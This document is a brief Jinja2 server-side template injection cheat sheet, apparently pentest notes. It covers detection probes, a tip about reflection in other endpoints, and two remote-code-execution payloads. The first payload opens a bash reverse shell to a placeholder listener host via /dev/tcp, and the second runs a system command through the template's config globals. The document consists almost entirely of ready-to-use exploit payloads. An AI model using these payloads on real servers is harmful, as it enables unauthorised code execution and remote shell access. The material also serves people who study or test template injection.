# Jinja2 SSTI RCE

Test: inject `{{7*7}}` — if output is `49`, Jinja2 confirmed. Check `{{7*'7'}}` → `7777777` confirms Jinja2 vs Twig.

**Note:** Reflection may appear in a different endpoint (e.g. `/archive` RSS feed, not the visible post body).

**RCE payload:**
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('bash -c "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"').read().zfill(417)}}{% endif %}{% endfor %}
```

**Simpler RCE:**
```
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```
